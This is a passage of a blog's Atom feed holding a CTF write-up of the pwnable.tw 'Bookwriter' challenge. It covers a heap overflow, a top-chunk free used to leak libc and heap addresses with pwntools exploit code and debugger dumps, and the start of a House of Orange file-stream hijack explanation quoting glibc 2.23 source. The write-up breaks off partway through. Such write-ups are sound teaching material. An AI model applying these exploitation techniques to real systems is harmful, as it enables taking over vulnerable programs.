<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[pwnable on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/pwnable/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/pwnable/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2022-10-10T00:25:22+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/pwnable/</id>
        
        <entry>
            <title type="html"><![CDATA[[pwnable - pwn] Bookwriter]]></title>
            <link href="https://nasm.re/posts/bookwriter/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/bookwriter/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-04-19T00:00:00+00:00</published>
            <updated>2022-04-19T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="what-we-can-do">
        What we can do
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#what-we-can-do" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we can do" href="#what-we-can-do">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>In the edit feature, we can overwrite the bytes right after any chunk up to the <code>NULL</code> byte.</li>
<li>In the alloc handler, it iterates once too may times through the alloc array, which means it can overlap on the first entry of the size array with a huge size which would be a chunk address, then we can easily trigger large heap overflow.</li>
</ul>
<p>The libc version is <code>2.23</code> which means there not a lot of security checks about <code>_IO_FILE_plus</code> integrity compared to more recent versions.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="top-chunk-freein">
        Top chunk free&rsquo;in
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#top-chunk-freein" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Top chunk free&rsquo;in" href="#top-chunk-freein">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To target <code>_IO_FILE_plus</code> structures in the libc we need to leak the libc address. To do so we can overwrite the size field of the top chunk with a small value and then requesting a huge chunk which will trigger the release of the top chunk, and put it in the unsorted bin.</p>
<p>The mandatory thing is that <code>new_size + &amp;top_chunk</code> has to be aligned on <code>PAGE_SZ</code> (<code>0x1000</code>).</p>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">set_author</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Author :&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content :&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">-&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content:&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">info</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;(yes:1 / no:0) &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="n">set_author</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span><span class="p">(</span><span class="mh">0xfe0</span> <span class="o">|</span> <span class="mh">0x1</span><span class="p">))</span>
<span class="c1"># overwrite top chunk size field</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="c1"># free top chunk</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">pwndbg&gt; vis
</span><span class="s2">
</span><span class="s2">0x1201000	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x1201010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
</span><span class="s2">0x1201020	0x4141414141414141	0x0000000000000fc1	AAAAAAAA........	 &lt;-- unsortedbin[all][0]
</span><span class="s2">0x1201030	0x00007fc7370efb78	0x00007fc7370efb78	x..7....x..7....
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div><p>To leak the address, we can alloc a chunk of size zero and print it. Given the fact that the <code>author</code> string is right before the alloc array and that we can overwrite the <code>NULL</code> byte we can in the same way leak the heap address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">info</span><span class="p">()</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;Author : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class="p">):][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4188</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x150c000	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x150c010	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
</span><span class="s2">0x150c020	0x4141414141414141	0x0000000000000021	AAAAAAAA!.......
</span><span class="s2">0x150c030	0x00007fd150996188	0x00007fd150996188	.a.P.....a.P....
</span><span class="s2">0x150c040	0x000000000150c020	0x0000000000000021	 .P.....!.......
</span><span class="s2">0x150c050	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
</span><span class="s2">0x150c060	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x150c070	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
</span><span class="s2">0x150c080	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x150c090	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
</span><span class="s2">0x150c0a0	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x150c0b0	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
</span><span class="s2">0x150c0c0	0x0000000000000000	0x0000000000000021	........!.......
</span><span class="s2">0x150c0d0	0x00007fd150996188	0x00007fd150996188	.a.P.....a.P....
</span><span class="s2">0x150c0e0	0x000000000150c0c0	0x0000000000000f01	..P.............	 &lt;-- unsortedbin[all][0]
</span><span class="s2">0x150c0f0	0x00007fd150995b78	0x00007fd150995b78	x[.P....x[.P....
</span><span class="s2">&#34;&#34;&#34;&#34;</span>
</code></pre></div><p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 exploit.py LOCAL
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter&#39;</span>
    FORTIFY:  Enabled
<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/home/nasm/Documents/pwn/pwnable.tw/bookwriter/bookwriter&#39;</span>: pid <span class="m">19375</span>
heap: 0x979000
libc: 0x7f301566d000
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="file-stream-exploitation">
        File stream exploitation
        <a data-clipboard-text="https://nasm.re/posts/bookwriter/#file-stream-exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor File stream exploitation" href="#file-stream-exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>File stream exploitation is a very interesting way to drop a shell according to the primitives it allows you to leverage. The house of Orange uses the <code>vtable</code> field within a <code>_IO_FILE_plus</code> structure to hiijack the control flow.</p>
<p>According to the libc source code, here is the definition of <code>struct _IO_FILE_plus</code>, <code>_IO_FILE</code> and <code>_IO_jump_t</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* We always allocate an extra word following an _IO_FILE.
</span><span class="cm">   This contains a pointer to the function jump table used.
</span><span class="cm">   This is for compatibility with C++ streambuf; the word can
</span><span class="cm">   be used to smash to a pointer to a virtual function table. */</span>

<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="cp">#define _IO_file_flags _flags
</span><span class="cp"></span>
  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">  int _blksize;
</span><span class="c"></span><span class="cp">#else
</span><span class="cp"></span>  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>

<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp">
</span><span class="cp"></span>  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="cp"></span><span class="p">};</span>

<span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="cp">#if 0</span><span class="c">
</span><span class="c">    get_column;
</span><span class="c">    set_column;
</span><span class="c"></span><span class="cp">#endif
</span><span class="cp"></span><span class="p">};</span>


<span class="cm">/* The &#39;overflow&#39; hook flushes the buffer.
</span><span class="cm">   The second argument is a character, or EOF.
</span><span class="cm">   It matches the streambuf::overflow virtual function. */</span>
<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
</code></pre></div><p>The <code>__overflow</code> function pointer is called especially in the <code>_IO_flush_all_lockp</code> function, to really understand how you can reach this function I will put right below all the backtrace from the <code>malloc_printerr</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span>
<span class="nf">malloc_printerr</span> <span class="p">(</span><span class="kt">int</span> <span class="n">action</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* Avoid using this arena in future.  We do not attempt to synchronize this
</span><span class="cm">     with anything else because we minimally want to ensure that __libc_message
</span><span class="cm">     gets its resources safely without stumbling on the current corruption.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ar_ptr</span><span class="p">)</span>
    <span class="n">set_arena_corrupt</span> <span class="p">(</span><span class="n">ar_ptr</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">((</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span>
    <span class="n">__libc_message</span> <span class="p">(</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">uintptr_t</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>

      <span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
      <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">_itoa_word</span> <span class="p">((</span><span class="n">uintptr_t</span><span class="p">)</span> <span class="n">ptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
      <span class="k">while</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
        <span class="o">*--</span><span class="n">cp</span> <span class="o">=</span> <span class="sc">&#39;0&#39;</span><span class="p">;</span>

      <span class="n">__libc_message</span> <span class="p">(</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">,</span> <span class="s">&#34;*** Error in `%s&#39;: %s: 0x%s ***</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
                      <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?</span> <span class="o">:</span> <span class="s">&#34;&lt;unknown&gt;&#34;</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">cp</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">action</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">abort</span> <span class="p">();</span>
<span class="p">}</span>

<span class="c1">// =&gt; __libc_message is always taken as far as I know when an inconsistency is detected since there is an error to print, but action &amp; 2 is true, which means that anyway, the abort is called as we can see right after in __libc_message.
</span><span class="c1"></span>
<span class="cm">/* Abort with an error message.  */</span>
<span class="kt">void</span>
<span class="nf">__libc_message</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_abort</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
  <span class="n">va_list</span> <span class="n">ap</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

  <span class="n">va_start</span> <span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>

<span class="cp">#ifdef FATAL_PREPARE
</span><span class="cp"></span>  <span class="n">FATAL_PREPARE</span><span class="p">;</span>
<span class="cp">#endif
</span><span class="cp"></span>
  <span class="cm">/* Open a descriptor for /dev/tty unless the user explicitly
</span><span class="cm">     requests errors on standard error.  */</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">on_2</span> <span class="o">=</span> <span class="n">__libc_secure_getenv</span> <span class="p">(</span><span class="s">&#34;LIBC_FATAL_STDERR_&#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">on_2</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">*</span><span class="n">on_2</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open_not_cancel_2</span> <span class="p">(</span><span class="n">_PATH_TTY</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_NOCTTY</span> <span class="o">|</span> <span class="n">O_NDELAY</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">STDERR_FILENO</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">str_list</span> <span class="o">*</span><span class="n">list</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">nlist</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cp</span> <span class="o">=</span> <span class="n">fmt</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">cp</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Find the next &#34;%s&#34; or the end of the string.  */</span>
      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">next</span> <span class="o">=</span> <span class="n">cp</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span><span class="n">next</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;%&#39;</span> <span class="o">||</span> <span class="n">next</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;s&#39;</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">next</span> <span class="o">=</span> <span class="n">__strchrnul</span> <span class="p">(</span><span class="n">next</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="sc">&#39;%&#39;</span><span class="p">);</span>

